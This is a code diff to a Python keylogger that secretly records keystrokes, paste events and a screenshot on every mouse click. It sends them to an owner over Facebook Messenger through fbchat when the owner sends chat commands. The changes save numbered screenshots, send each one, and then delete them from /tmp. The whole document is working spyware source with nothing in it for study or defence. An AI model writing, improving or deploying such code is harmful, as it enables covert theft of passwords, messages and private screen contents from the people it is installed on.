@@ -1,4 +1,5 @@
 import os
+import glob
 import keyboard
 from keyboard import mouse
 import pyscreenshot
@@ -17,7 +18,9 @@ class FacebookController(fbchat.Client):
 
     def on_message(self, mid, author_id, author_name, message, metadata):
         if message == 'screen':
-            self.sendLocalImage(self.owner_uid, message='to widzialem', image='/tmp/screen.jpg')
+            for screenshot in self.keylogger.get_saved_screenshots():
+                self.sendLocalImage(self.owner_uid, message='to widzialem', image=screenshot)
+            self.keylogger.reset_screenshot_directory()
         if message == 'logs':
             self.send_to_owner(''.join(self.keylogger.flush_captured_keys()))
 
@@ -27,6 +30,8 @@ class Keylogger(object):
         self.captured_keys = []
         self.captured_pasting = []
 
+        self.reset_screenshot_directory()
+
         keyboard.on_press(self._on_key_press)
         keyboard.add_hotkey('ctrl+v', self._on_paste)
         keyboard.mouse.on_click(self._on_left_mouse_button_click)
@@ -35,9 +40,17 @@ class Keylogger(object):
         captured_keys, self.captured_keys = self.captured_keys, []
         return captured_keys
 
+    def get_saved_screenshots(self):
+        return glob.glob('/tmp/screen*.jpg')
+
+    def reset_screenshot_directory(self):
+        self.screenshot_counter = 0
+        os.system('rm /tmp/screen*.jpg')
+
     def _on_left_mouse_button_click(self):
         screenshot = pyscreenshot.grab()
-        screenshot.save('/tmp/screen.jpg')
+        screenshot.save('/tmp/screen{}.jpg'.format(self.screenshot_counter))
+        self.screenshot_counter += 1
 
     def _on_key_press(self, event):
         if len(event.name) > 1:
